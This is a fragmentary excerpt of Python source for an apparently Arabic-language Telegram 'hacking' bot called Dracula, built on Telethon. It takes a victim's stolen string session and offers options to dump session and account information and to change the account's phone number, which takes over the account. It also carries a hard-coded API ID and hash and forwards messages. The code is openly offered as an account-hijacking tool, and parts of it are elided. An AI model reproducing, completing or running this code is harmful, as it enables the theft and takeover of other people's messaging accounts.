...
client = TelegramClient('DRAGON', api_id, api_hash).start(bot_token=token)
...
async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 17414270, "86ca121508b9b6761dbc01a5a877ee48") as X:
    bot = client = X
    try: 
...
async def op(event):
  if not event.sender_id == razan:
    return await event.reply("@Dragon_2022_D")
  async for x in client.iter_messages("RRRbz"):
    try:
      await x.forward_to("RRRbz")
    except:
      pass
  ...
  async with bot.conversation(event.chat_id) as x:
    ...
    if res.text == "A":
      ...
      if len(i) > 3855:
        ...
        file.write(i + "\n\n▾∮ المعلومات بواسطه دراكولا")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n▾∮ شكرا لاستخدام بوت دراكولا للاختراق")
    elif res.text == "B":
      await x.send_message("▾∮ حسنا ارسل كود تيرمكس الآن ")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      try:
        ...
        await event.respond("اارسل هذا الخطأ الى @DRACULA_2023 \n**الخطـأ**\n" + str(e))
